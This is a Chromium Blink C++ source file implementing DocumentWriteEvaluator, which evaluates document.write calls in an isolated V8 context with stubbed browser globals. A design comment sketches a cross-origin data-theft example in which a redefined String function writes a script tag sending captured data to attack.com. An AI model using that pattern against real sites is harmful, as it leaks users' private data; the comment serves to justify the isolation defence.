// Copyright 2016 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include "bindings/core/v8/DocumentWriteEvaluator.h"

#include "bindings/core/v8/ScriptSourceCode.h"
#include "bindings/core/v8/V8BindingMacros.h"
#include "bindings/core/v8/V8ScriptRunner.h"
#include "core/frame/Location.h"
#include "platform/instrumentation/tracing/TraceEvent.h"
#include "platform/wtf/text/StringUTF8Adaptor.h"
#include "v8/include/v8.h"

namespace blink {

namespace {

void DocumentWriteCallback(const v8::FunctionCallbackInfo<v8::Value>& args) {
  void* ptr = v8::Local<v8::External>::Cast(args.Data())->Value();
  DocumentWriteEvaluator* evaluator = static_cast<DocumentWriteEvaluator*>(ptr);
  v8::HandleScope scope(args.GetIsolate());
  for (int i = 0; i < args.Length(); i++) {
    evaluator->RecordDocumentWrite(
        ToCoreStringWithNullCheck(args[i]->ToString()));
  }
}

}  // namespace

DocumentWriteEvaluator::DocumentWriteEvaluator(const Document& document) {
  // Note, evaluation will only proceed if |location| is not null.
  Location* location = document.location();
  if (location) {
    path_name_ = location->pathname();
    host_name_ = location->hostname();
    protocol_ = location->protocol();
  }
  user_agent_ = document.UserAgent();
}

// For unit testing.
DocumentWriteEvaluator::DocumentWriteEvaluator(const String& path_name,
                                               const String& host_name,
                                               const String& protocol,
                                               const String& user_agent)
    : path_name_(path_name),
      host_name_(host_name),
      protocol_(protocol),
      user_agent_(user_agent) {}

DocumentWriteEvaluator::~DocumentWriteEvaluator() {}

// Create a new context and global stubs lazily. Note that we must have a
// separate v8::Context per HTMLDocumentParser. Separate Documents cannot share
// contexts. For instance:
// Origin A:
// <script>
// var String = function(capture) {
//     document.write(<script src="http://attack.com/url=" + capture/>);
// }
// </script>
//
// Now, String is redefined in the context to capture user information and post
// to the evil site. If the user navigates to another origin that the preloader
// targets for evaluation, their data is vulnerable. E.g.
// Origin B:
// <script>
// var userData = [<secret data>, <more secret data>];
// document.write("<script src='/postData/'"+String(userData)+"' />");
// </script>
bool DocumentWriteEvaluator::EnsureEvaluationContext() {
  if (!persistent_context_.IsEmpty())
    return false;
  TRACE_EVENT0("blink", "DocumentWriteEvaluator::initializeEvaluationContext");
  DCHECK(persistent_context_.IsEmpty());
  v8::Isolate* isolate = V8PerIsolateData::MainThreadIsolate();
  v8::Isolate::Scope isolate_scope(isolate);
  v8::HandleScope handle_scope(isolate);
  v8::Local<v8::Context> context = v8::Context::New(isolate);
  persistent_context_.Set(isolate, context);
  v8::Context::Scope context_scope(context);

  // Initialize global objects.
  window_.Set(isolate, v8::Object::New(isolate));
  location_.Set(isolate, v8::Object::New(isolate));
  navigator_.Set(isolate, v8::Object::New(isolate));
  document_.Set(isolate, v8::Object::New(isolate));

  // Initialize strings that are used more than once.
  v8::Local<v8::String> location_string = V8String(isolate, "location");
  v8::Local<v8::String> navigator_string = V8String(isolate, "navigator");
  v8::Local<v8::String> document_string = V8String(isolate, "document");

  window_.NewLocal(isolate)->Set(location_string, location_.NewLocal(isolate));
  window_.NewLocal(isolate)->Set(document_string, document_.NewLocal(isolate));
  window_.NewLocal(isolate)->Set(navigator_string,
                                 navigator_.NewLocal(isolate));

  v8::Local<v8::FunctionTemplate> write_template = v8::FunctionTemplate::New(
      isolate, DocumentWriteCallback, v8::External::New(isolate, this));
  write_template->RemovePrototype();
  document_.NewLocal(isolate)->Set(location_string,
                                   location_.NewLocal(isolate));
  document_.NewLocal(isolate)->Set(V8String(isolate, "write"),
                                   write_template->GetFunction());
  document_.NewLocal(isolate)->Set(V8String(isolate, "writeln"),
                                   write_template->GetFunction());

  location_.NewLocal(isolate)->Set(V8String(isolate, "pathname"),
                                   V8String(isolate, path_name_));
  location_.NewLocal(isolate)->Set(V8String(isolate, "hostname"),
                                   V8String(isolate, host_name_));
  location_.NewLocal(isolate)->Set(V8String(isolate, "protocol"),
                                   V8String(isolate, protocol_));
  navigator_.NewLocal(isolate)->Set(V8String(isolate, "userAgent"),
                                    V8String(isolate, user_agent_));

  V8CallBoolean(context->Global()->Set(context, V8String(isolate, "window"),
                                       window_.NewLocal(isolate)));
  V8CallBoolean(context->Global()->Set(context, document_string,
                                       document_.NewLocal(isolate)));
  V8CallBoolean(context->Global()->Set(context, location_string,
                                       location_.NewLocal(isolate)));
  V8CallBoolean(context->Global()->Set(context, navigator_string,
                                       navigator_.NewLocal(isolate)));
  return true;
}

bool DocumentWriteEvaluator::Evaluate(const String& script_source) {
  TRACE_EVENT0("blink", "DocumentWriteEvaluator::evaluate");
  v8::Isolate* isolate = V8PerIsolateData::MainThreadIsolate();
  v8::Isolate::Scope isolate_scope(isolate);
  v8::HandleScope handle_scope(isolate);
  v8::Context::Scope context_scope(persistent_context_.NewLocal(isolate));

  // TODO(csharrison): Consider logging compile / execution error counts.
  StringUTF8Adaptor source_utf8(script_source);
  v8::MaybeLocal<v8::String> source =
      v8::String::NewFromUtf8(isolate, source_utf8.Data(),
                              v8::NewStringType::kNormal, source_utf8.length());
  if (source.IsEmpty())
    return false;
  v8::TryCatch try_catch(isolate);
  return !V8ScriptRunner::CompileAndRunInternalScript(source.ToLocalChecked(),
                                                      isolate)
              .IsEmpty();
}

bool DocumentWriteEvaluator::ShouldEvaluate(const String& source) {
  return !host_name_.IsEmpty() && !user_agent_.IsEmpty();
}

String DocumentWriteEvaluator::EvaluateAndEmitWrittenSource(
    const String& script_source) {
  if (!ShouldEvaluate(script_source))
    return "";
  TRACE_EVENT0("blink", "DocumentWriteEvaluator::evaluateAndEmitStartTokens");
  document_written_strings_.Clear();
  Evaluate(script_source);
  return document_written_strings_.ToString();
}

void DocumentWriteEvaluator::RecordDocumentWrite(
    const String& document_written_string) {
  document_written_strings_.Append(document_written_string);
}

}  // namespace blink
